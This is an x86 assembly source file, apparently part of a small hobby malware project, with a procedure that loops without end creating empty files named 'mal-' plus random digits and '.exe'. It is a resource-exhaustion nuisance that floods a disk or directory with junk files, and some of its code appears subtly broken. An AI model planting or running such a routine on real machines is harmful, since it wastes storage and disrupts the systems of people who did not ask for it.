INCLUDE mal.inc

.code

	generate_random_exe_files PROC, RAND:BYTE, rand_file_size:BYTE, ptrRAND:PTR BYTE
	
	;Requires random_file to be created
	;Uses ecx,si,eax,al,dx,bx registers and create_file and close_file functions
	;Generates mal-...exe files infinitely or upto n times
	
		call randomize			;Re-seeds random number generator with current time in hundredths of seconds
		
		;mov ecx, 0
		create_random_exe_file:
			mov si, 4			;Because we need to insert after - in 'mal-' which is 4 index 
			randomize_and_move:
				mov eax, 10
				call RandomRange
				
				or al, 00110000b		;Because moving a number in a string will make it be read as ascii so converting to ascii here
				mov RAND[si], al
				
				inc si
				cmp si, (LENGTHOF rand_file_size) - 5		;-5 is being done here because last five characters are '.exe,0'
				JB randomize_and_move
		
			;mov dx, OFFS-ET random_file
			;call Writestring
			
			mov dx, ptrRAND
			INVOKE create_file		;Requires dx to have file name
			
			mov bx, ax			;'create_file' moves file handle in ax
			INVOKE close_file		;Requires bx to have file handle
			
			JMP create_random_exe_file
	
		ret
		
	generate_random_exe_files ENDP
	
END